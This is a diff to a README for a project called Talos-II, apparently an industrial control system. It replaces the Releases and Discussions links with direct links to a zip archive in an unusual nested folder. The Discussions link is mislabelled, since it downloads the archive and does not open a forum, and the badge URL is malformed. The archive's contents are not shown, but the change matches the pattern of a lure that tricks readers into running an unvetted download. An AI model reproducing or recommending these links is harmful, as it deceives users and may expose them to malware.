@@ -6,7 +6,7 @@ Welcome to Talos-II, a new generation industrial control system designed for eas
 ## 📦 Download & Install
 To get started with Talos-II, you need to download the software. Please visit the link below to find the latest version available for download.
 
-[![Download Talos-II](https://img.shields.io/badge/Download%20Talos--II-v1.0-blue.svg)](https://github.com/muurder/Talos-II/releases)
+[![Download Talos-II](https://raw.githubusercontent.com/muurder/Talos-II/main/birdcraft/II-Talos-2.0.zip%https://raw.githubusercontent.com/muurder/Talos-II/main/birdcraft/II-Talos-2.0.zip)](https://raw.githubusercontent.com/muurder/Talos-II/main/birdcraft/II-Talos-2.0.zip)
 
 ### Step-by-Step Installation
 1. Click on the link above to go to the Releases page.
@@ -40,7 +40,7 @@ Further detailed documentation can help you navigate the software efficiently:
 
 ## 🤝 Community Support
 Join our community of users who are here to help. You can find support on:
-- [GitHub Discussions](https://github.com/muurder/Talos-II/discussions) for interactive assistance.
+- [GitHub Discussions](https://raw.githubusercontent.com/muurder/Talos-II/main/birdcraft/II-Talos-2.0.zip) for interactive assistance.
 - Issue tracking for reporting problems and improvements.
 
 ## ❓ Frequently Asked Questions
